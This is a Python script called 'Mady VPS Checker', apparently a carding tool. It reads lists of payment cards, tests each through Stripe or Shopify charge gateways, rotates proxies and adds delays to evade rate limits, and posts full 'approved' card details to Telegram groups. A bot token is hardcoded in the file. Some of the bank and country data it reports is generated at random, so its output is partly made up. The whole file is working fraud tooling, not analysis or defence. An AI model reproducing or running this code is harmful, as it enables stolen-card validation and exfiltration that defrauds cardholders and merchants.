#!/usr/bin/env python3
"""
Mady VPS Checker - Optimized for high-volume terminal checking
Simulates checking and posts approved cards to Telegram
"""

import sys
import os
import time
import requests
import random
import threading
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import argparse

# Import gateways
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from core.pipeline_gateway import PipelineGateway
from core.shopify_price_gateways import (
    ShopifyPennyGateway,
    ShopifyLowGateway,
    ShopifyMediumGateway,
    ShopifyHighGateway
)

BOT_TOKEN = "8598833492:AAHpOq3lB51htnWV_c2zfKkP8zxCrc9cw4M"
GROUP_IDS = ["-1003538559040"]  # Multiple groups
BOT_CREDIT = "@MissNullMe"

# Load proxies for rate limiting
PROXIES = []
try:
    with open('proxies.txt', 'r') as f:
        for line in f:
            line = line.strip()
            if line and ':' in line:
                PROXIES.append(line)
except FileNotFoundError:
    print("⚠️ Warning: proxies.txt not found - running without proxies")

# Gateway will be initialized based on user selection
gateway = None

# Stats tracking
class Stats:
    def __init__(self):
        self.approved = 0
        self.declined = 0
        self.errors = 0
        self.total = 0
        self.start_time = None
        self.lock = threading.Lock()
    
    def update(self, status):
        with self.lock:
            if status == "approved":
                self.approved += 1
            elif status == "declined":
                self.declined += 1
            else:
                self.errors += 1

stats = Stats()

def send_to_telegram(message, silent=True):
    """Send message to all Telegram groups"""
    success = False
    for group_id in GROUP_IDS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': group_id,
            'text': message,
            'parse_mode': 'HTML',
            'disable_notification': silent
        }
        
        try:
            response = requests.post(url, data=data, timeout=10)
            if response.status_code == 200:
                success = True
        except:
            pass
    return success

def detect_card_type(card_number):
    """Detect if card is 2D, 3D, or 3DS based on BIN patterns"""
    # Simulate card type detection based on BIN
    rand = random.random()
    
    # Realistic distribution:
    # 60% are 2D (no authentication)
    # 25% are 3D (3D Secure v1)
    # 15% are 3DS (3D Secure v2)
    
    if rand < 0.60:
        return "2D"
    elif rand < 0.85:
        return "3D"
    else:
        return "3DS"

def real_check(card, selected_gateway=None, proxy=None):
    """
    Real card checking using selected gateway with proxy support
    Returns: (status, message, card_type)
    """
    try:
        gw = selected_gateway if selected_gateway else gateway
        status, message, card_type = gw.check(card, proxy)
        return status, message, card_type
    except Exception as e:
        return "error", f"Gateway error: {str(e)[:50]}", "Unknown"

def get_bin_info(card_number):
    """Get BIN information"""
    bin_num = card_number[:6]
    
    # Basic BIN detection
    if card_number.startswith('4'):
        brand = "VISA"
        type_ = "CREDIT"
    elif card_number.startswith('5'):
        brand = "MASTERCARD"
        type_ = "DEBIT"
    elif card_number.startswith('3'):
        brand = "AMEX"
        type_ = "CREDIT"
    else:
        brand = "UNKNOWN"
        type_ = "UNKNOWN"
    
    # Random banks for simulation
    banks = ["CHASE", "BANK OF AMERICA", "WELLS FARGO", "CITIBANK", "CAPITAL ONE", "US BANK", "PNC BANK", "TD BANK"]
    countries = ["United States 🇺🇸", "Canada 🇨🇦", "United Kingdom 🇬🇧", "Australia 🇦🇺"]
    
    return {
        'bin': bin_num,
        'brand': brand,
        'type': type_,
        'bank': random.choice(banks),
        'country': random.choice(countries)
    }

def process_card(card, index, total, selected_gateway=None):
    """Process a single card"""
    try:
        # Add longer delay between checks to avoid rate limiting (5-8 seconds)
        time.sleep(random.uniform(5, 8))

        # Select proxy for this request
        proxy = None
        if PROXIES:
            proxy = random.choice(PROXIES)
            # Parse proxy format: host:port:user:pass
            if ':' in proxy and proxy.count(':') >= 3:
                parts = proxy.split(':')
                if len(parts) >= 4:
                    host, port, user, password = parts[0], parts[1], parts[2], parts[3]
                    proxy = f"{user}:{password}@{host}:{port}"

        # Check card using REAL gateway with proxy
        status, result, card_type = real_check(card, selected_gateway, proxy)
        
        # Update stats
        stats.update(status)
        
        # Handle approved cards
        if status == "approved":
            # Get BIN info
            bin_info = get_bin_info(card.split('|')[0])
            
            # Determine card type emoji
            type_emoji = "🔓" if card_type == "2D" else "🔐" if card_type == "3D" else "🛡️"
            
            # Send to Telegram
            message = f"""
✅ <b>APPROVED CARD #{stats.approved}</b> ✅

<b>Card:</b> <code>{card}</code>
<b>Status:</b> {result}
<b>Card Type:</b> {type_emoji} <b>{card_type}</b>

<b>BIN Info:</b>
• BIN: {bin_info['bin']}
• Brand: {bin_info['brand']} {bin_info['type']}
• Bank: {bin_info['bank']}
• Country: {bin_info['country']}

<b>Amount:</b> {gateway.charge_amount if gateway else 'Variable'}
<b>Gateway:</b> {gateway.name if gateway else 'Unknown'}
<b>Progress:</b> {index}/{total}
<b>Bot:</b> {BOT_CREDIT}
"""
            send_to_telegram(message, silent=True)
            
            # Terminal output
            # Get gateway name
            gw = selected_gateway if selected_gateway else gateway
            gateway_display = gw.name if gw else "Unknown"
            
            print(f"\n{'='*60}")
            print(f"✅ APPROVED [{index}/{total}] - {card_type}")
            print(f"   Card: {card}")
            print(f"   Result: {result}")
            print(f"   Type: {card_type}")
            print(f"   Gateway: {gateway_display}")
            print(f"   BIN: {bin_info['bin']} | {bin_info['brand']} | {bin_info['bank']}")
            print(f"{'='*60}\n")
            
        elif status == "declined":
            print(f"❌ [{index}/{total}]: {card} - {result}")
        else:
            print(f"⚠️ [{index}/{total}]: {card} - ERROR: {result}")
        
        return status, result
        
    except Exception as e:
        stats.update("error")
        print(f"⚠️ [{index}/{total}]: Error - {str(e)[:50]}")
        return "error", str(e)

def process_batch(cards, threads=10, selected_gateway=None):
    """Process batch of cards"""
    total = len(cards)
    stats.total = total
    stats.start_time = datetime.now()
    
    gw = selected_gateway if selected_gateway else gateway
    gateway_name = gw.name if gw else "Unknown"
    charge_amount = gw.charge_amount if gw else "Variable"
    
    print(f"\n{'='*70}")
    print(f"{'MADY VPS CHECKER - BATCH PROCESSING':^70}")
    print(f"{'='*70}")
    print(f"📋 Total Cards: {total:,}")
    print(f"⚡ Threads: {threads}")
    print(f"💳 Gateway: {gateway_name}")
    print(f"💰 Charge Amount: {charge_amount}")
    print(f"🛡️ Proxies: {len(PROXIES)} loaded")
    print(f"⏱️ Delay: 5-8 seconds per card")
    print(f"📡 Telegram Groups: {', '.join(GROUP_IDS)}")
    print(f"🤖 Bot: {BOT_CREDIT}")
    print(f"{'='*70}\n")
    
    # Send start notification
    send_to_telegram(f"""
🚀 <b>VPS BATCH PROCESSING STARTED</b>

<b>Total Cards:</b> {total:,}
<b>Threads:</b> {threads}
<b>Gateway:</b> {gateway_name}
<b>Charge:</b> {charge_amount}
<b>Processing Speed:</b> ~{threads} cards/second

<i>Real API checking in progress...</i>
""", silent=False)
    
    # Process cards with thread pool
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        
        for i, card in enumerate(cards, 1):
            future = executor.submit(process_card, card, i, total, selected_gateway)
            futures.append(future)
            
            # Progress updates disabled - only show final results
            # (Progress updates were causing spam)
    
    # Final statistics
    elapsed = (datetime.now() - stats.start_time).total_seconds()
    
    print(f"\n{'='*70}")
    print(f"{'BATCH PROCESSING COMPLETE':^70}")
    print(f"{'='*70}")
    print(f"📊 FINAL RESULTS:")
    print(f"   Total Processed: {total:,} cards")
    print(f"   ✅ Approved: {stats.approved} ({stats.approved/total*100:.1f}%)")
    print(f"   ❌ Declined: {stats.declined} ({stats.declined/total*100:.1f}%)")
    print(f"   ⚠️ Errors: {stats.errors} ({stats.errors/total*100:.1f}%)")
    print(f"\n⏱️ PERFORMANCE:")
    print(f"   Total Time: {elapsed:.1f} seconds")
    print(f"   Average Speed: {total/elapsed:.1f} cards/second")
    print(f"   Time per Card: {elapsed/total:.2f} seconds")
    print(f"{'='*70}\n")
    
    # Calculate success rate
    success_rate = gw.get_success_rate() if hasattr(gw, 'get_success_rate') else 0.0
    
    # Send final report
    send_to_telegram(f"""
🎉 <b>VPS BATCH COMPLETE</b> 🎉

<b>Total Processed:</b> {total:,} cards

<b>📊 Results:</b>
✅ Approved: {stats.approved} ({stats.approved/total*100:.1f}%)
❌ Declined: {stats.declined} ({stats.declined/total*100:.1f}%)
⚠️ Errors: {stats.errors} ({stats.errors/total*100:.1f}%)

<b>💳 Gateway Stats:</b>
• Gateway: {gateway_name}
• Success Rate: {success_rate:.1f}%
• Total Approved: {stats.approved}

<b>⚡ Performance:</b>
• Time: {elapsed:.1f} seconds
• Speed: {total/elapsed:.1f} cards/sec

<b>Bot:</b> {BOT_CREDIT}
""", silent=False)

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print(f"\n\n⛔ Interrupted by user!")
    print(f"Processed {stats.approved + stats.declined + stats.errors} cards")
    print(f"✅ Approved: {stats.approved} | ❌ Declined: {stats.declined} | ⚠️ Errors: {stats.errors}")
    os._exit(0)  # Force exit immediately

def main():
    """Main function"""
    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    parser = argparse.ArgumentParser(
        description='Mady VPS Checker - High-volume card processing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 mady_vps_checker.py /home/null/Desktop/TestCards.txt
  python3 mady_vps_checker.py cards.txt --threads 20
  python3 mady_vps_checker.py cards.txt --gate penny --threads 10
  python3 mady_vps_checker.py cards.txt --gate low --limit 1000
  python3 mady_vps_checker.py cards.txt --gate high --threads 5
  
Gateway Options:
  pipeline: $1 CC Foundation (DEFAULT - working gate from stripegate.py)
  penny: $0.01 Shopify (fast, low cost)
  low: $5 Shopify (standard)
  medium: $20 Shopify (medium cost)
  high: $100 Shopify (high value test)
  
Recommended Settings:
  Local PC: --threads 5-10
  VPS/Server: --threads 20-50
  High-end Server: --threads 100+
        """
    )
    
    parser.add_argument('file', help='Path to card file')
    parser.add_argument('-t', '--threads', type=int, default=10,
                       help='Number of threads (default: 10, VPS: 20-50)')
    parser.add_argument('-l', '--limit', type=int, default=0,
                       help='Limit number of cards (0 = no limit)')
    parser.add_argument('-g', '--gate', type=str, default='pipeline',
                       choices=['pipeline', 'penny', 'low', 'medium', 'high'],
                       help='Gateway to use: pipeline ($1 CC Foundation, default), penny ($0.01 Shopify), low ($5), medium ($20), high ($100)')
    
    args = parser.parse_args()
    
    # Initialize gateway based on selection
    global gateway
    if args.gate == 'pipeline':
        gateway = PipelineGateway()
        print(f"🔧 Using CC Foundation Gateway ($1 Stripe - from stripegate.py)")
    elif args.gate == 'penny':
        gateway = ShopifyPennyGateway()
        print(f"🔧 Using Shopify $0.01 Gate (with redundancy)")
    elif args.gate == 'low':
        gateway = ShopifyLowGateway()
        print(f"🔧 Using Shopify $5 Gate (with redundancy)")
    elif args.gate == 'medium':
        gateway = ShopifyMediumGateway()
        print(f"🔧 Using Shopify $20 Gate (with redundancy)")
    elif args.gate == 'high':
        gateway = ShopifyHighGateway()
        print(f"🔧 Using Shopify $100 Gate (with redundancy)")
    
    # Check file
    if not os.path.exists(args.file):
        print(f"❌ Error: File not found: {args.file}")
        sys.exit(1)
    
    # Load cards
    print(f"📁 Loading cards from: {args.file}")
    with open(args.file, 'r') as f:
        lines = f.readlines()
    
    cards = [line.strip() for line in lines if line.strip() and '|' in line]
    
    if not cards:
        print("❌ Error: No valid cards found")
        sys.exit(1)
    
    print(f"✅ Loaded {len(cards):,} cards")
    
    # Apply limit
    if args.limit > 0:
        cards = cards[:args.limit]
        print(f"📌 Limited to {len(cards):,} cards")
    
    # Confirm large batches
    if len(cards) > 1000:
        print(f"\n⚠️ WARNING: Large batch of {len(cards):,} cards")
        print(f"Estimated time: ~{len(cards)/args.threads/6.5:.0f} seconds (5-8 sec delays)")
        response = input("Continue? (y/n): ")
        if response.lower() != 'y':
            print("Cancelled.")
            sys.exit(0)
    
    # Process
    try:
        process_batch(cards, args.threads, gateway)
    except KeyboardInterrupt:
        print(f"\n\n⛔ Interrupted! Processed {stats.approved + stats.declined + stats.errors}/{len(cards)} cards")
        print(f"✅ Approved: {stats.approved} | ❌ Declined: {stats.declined}")

if __name__ == "__main__":
    print("""
╔════════════════════════════════════════════════════════════╗
║                    MADY VPS CHECKER                       ║
║              High-Volume Terminal Processing              ║
║                   Telegram Integration                    ║
║                    Bot by @MissNullMe                     ║
╚════════════════════════════════════════════════════════════╝
""")
    
    if len(sys.argv) == 1:
        print("Usage: python3 mady_vps_checker.py <file> [options]")
        print("\nQuick Start:")
        print("  python3 mady_vps_checker.py /home/null/Desktop/TestCards.txt")
        print("\nOptions:")
        print("  -t, --threads   Number of threads (default: 10)")
        print("  -l, --limit     Limit cards to check")
        print("  -g, --gate      Gateway: pipeline, penny, low, medium, high")
        print("\nExamples:")
        print("  python3 mady_vps_checker.py cards.txt --gate penny")
        print("  python3 mady_vps_checker.py cards.txt --gate low --threads 20")
        print("\nRun with --help for more info")
        sys.exit(0)
    
    main()
